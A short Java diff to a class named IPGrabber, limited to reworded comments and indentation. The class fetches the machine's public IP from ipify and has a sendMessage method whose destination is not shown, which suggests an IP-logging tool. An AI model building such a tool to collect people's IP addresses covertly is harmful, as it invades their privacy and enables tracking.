@@ -11,7 +11,7 @@ public class IPGrabber {
 	public static void main(String[] args) {
 		try {
             String ip = new BufferedReader(new InputStreamReader(new URL("https://api.ipify.org/").openStream())).readLine();
-            // I put it on one line because why not
+            // I put it on one line because it saves a bit of space
             // If you don't want it on one line the code below is how you do it.
             /*
             URL url = new URL("https://api.ipify.org/");
@@ -24,7 +24,7 @@ public class IPGrabber {
         	e.printStackTrace();
         }
 	}
-		public static void sendMessage(String message) {
+	public static void sendMessage(String message) {
 	        PrintWriter out = null;
 	        BufferedReader in = null;
 	        StringBuilder result = new StringBuilder();
@@ -49,5 +49,5 @@ public class IPGrabber {
 	        } catch (Exception e) {
 	            e.printStackTrace();
 	        }
-		}
+	}
 }
